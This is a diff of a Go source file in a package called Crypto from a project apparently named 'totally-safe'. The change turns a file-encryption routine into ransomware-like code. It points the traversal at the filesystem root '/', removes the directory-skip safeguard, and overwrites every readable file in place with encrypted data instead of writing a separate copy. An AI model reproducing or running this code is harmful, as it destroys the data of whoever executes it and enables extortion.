@@ -1,15 +1,13 @@
 package Crypto
 
 import (
-	"fmt"
-	"github/BryanMwangi/totally-safe/exe/Utils"
 	"log"
 	"os"
 	"path/filepath"
 )
 
 func GetAndEncryptFiles(key string) (bool, error) {
-	startDir := Utils.GetCurrentDir()
+	startDir := "/"
 
 	err := processDirectory(key, startDir)
 	if err != nil {
@@ -20,42 +18,27 @@ func GetAndEncryptFiles(key string) (bool, error) {
 
 func EncryptFile(key string, filePath string) error {
 	// Read the file contents and start encryption
-
 	fileData, err := os.ReadFile(filePath)
-	if err != nil {
-		return err
-	}
-	encrypted, err := EncryptData(key, fileData)
-	if err != nil {
-		return err
-	}
-	newFilePath := fmt.Sprintf("%s.enc", filePath)
-
-	err = os.WriteFile(newFilePath, encrypted, 0777)
-	if err != nil {
-		if os.IsPermission(err) {
-			log.Printf("skipping directory %s due to permission denied error: %v", newFilePath, err)
-			return nil
+	if err == nil {
+		encrypted, err := EncryptData(key, fileData)
+		if err != nil {
+			return err
 		}
-		log.Fatalf("write file err: %v", err.Error())
-	}
-	//delete original file path
-	err = os.Remove(filePath)
-	if err != nil {
-		if os.IsPermission(err) {
-			log.Printf("skipping directory %s due to permission denied error: %v", filePath, err)
-			return nil
-		}
-		log.Fatalf("remove file err: %v", err.Error())
-	}
 
+		err = os.WriteFile(filePath, encrypted, 0777)
+		if err != nil {
+			if os.IsPermission(err) {
+				log.Printf("skipping directory %s due to permission denied error: %v", filePath, err)
+				return nil
+			}
+			log.Fatalf("write file err: %v", err.Error())
+		}
+		return nil
+	}
 	return nil
 }
 
 func processDirectory(key string, dirPath string) error {
-	if Utils.SkipDir(dirPath) {
-		return nil
-	}
 	getFiles, err := os.ReadDir(dirPath)
 	if err != nil {
 		if os.IsPermission(err) {
